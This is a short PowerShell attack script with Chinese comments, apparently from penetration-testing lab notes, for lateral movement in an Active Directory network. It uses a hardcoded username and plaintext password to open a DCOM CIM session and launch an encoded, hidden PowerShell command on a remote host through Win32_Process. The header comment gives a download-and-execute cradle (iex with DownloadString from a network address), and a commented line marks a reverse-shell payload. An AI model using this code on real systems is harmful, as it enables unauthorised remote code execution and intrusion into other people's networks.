#
# 调用方法: iex (New-Object Net.WebClient).downloadstring('http://192.168.45.178/t_ad-lateral-movement-with-wmic.ps1')
#
# powershell方式模拟wmic手动方式: wmic /node:192.168.239.72 /user:jen /password:Nexus123! process call create "cmd /C powershell -nop -w hidden -Enc ABC...DE"
#
# {{{ TODO: change this
$username = 'jen';
$password = 'Nexus123!';
$command = 'powershell -nop -w hidden -Enc JAB...ABC';
$target = '192.168.239.72'
# }}}

# 创建credential 对象
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

# 创建通用信息模型 CIM, 并为wmi会话指定协议为 DCOM
$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName $target -Credential $credential -SessionOption $options
# revshell
#$command = 'powershell -enc JAB...AD';
# poc

# 使用Win32_Process对象创建进程
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$command};
